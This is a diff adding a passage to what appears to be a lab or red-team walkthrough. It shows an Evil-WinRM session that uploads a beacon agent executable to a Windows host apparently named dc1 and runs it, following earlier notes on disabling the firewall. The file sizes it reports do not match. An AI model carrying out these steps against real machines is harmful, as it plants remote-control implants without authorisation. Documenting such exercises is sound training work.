@@ -804,5 +804,26 @@ The solution to this is to just disabled the firewall
 Ive regenerated the beacon now ill put it on the target 
 
 ```python
+*Evil-WinRM* PS C:\Users\Public\downloads> upload dc1-main-agent.x64.exe
+                                        
+Info: Uploading /home/kali/hsm/darkhaven/dc1-main-agent.x64.exe to C:\Users\Public\downloads\dc1-main-agent.x64.exe
+                                        
+Data: 120148 bytes of 120148 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Public\downloads> dir
 
+
+    Directory: C:\Users\Public\downloads
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         4/19/2026   6:51 PM          90112 dc1-main-agent.x64.exe
+
+
+*Evil-WinRM* PS C:\Users\Public\downloads> .\dc1-main-agent.x64.exe
+*Evil-WinRM* PS C:\Users\Public\downloads> 
 ```
+Ive uploaded it to the target now executed it!
+
